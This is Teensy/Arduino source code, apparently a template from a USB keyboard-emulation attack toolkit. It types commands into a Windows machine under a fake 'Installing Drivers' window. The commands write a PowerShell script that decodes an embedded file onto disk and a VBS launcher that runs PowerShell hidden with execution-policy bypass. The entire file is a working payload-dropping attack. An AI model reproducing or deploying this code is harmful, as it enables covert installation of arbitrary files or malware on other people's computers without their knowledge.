#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo $temp = @^\" > %temp%\\djar.ps1");
  ENCODEDFILE
  Keyboard.println("echo ^\"@ >> %temp%\\djar.ps1");
  Keyboard.println("echo $JFile = \"INPUT0\" >> %temp%\\djar.ps1");
  Keyboard.println("echo $temp = $temp -replace \" \",\",\" -replace \".$\" >> %temp%\\djar.ps1");
  Keyboard.println("echo [byte[]] $tmp =  $temp -split ',' >> %temp%\\djar.ps1");
  Keyboard.println("echo [System.IO.File]::WriteAllBytes($JFile, $tmp) >> %temp%\\djar.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\djar.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\djar.ps1\"),0,true >> %temp%\\djar.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\djar.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}

DEFS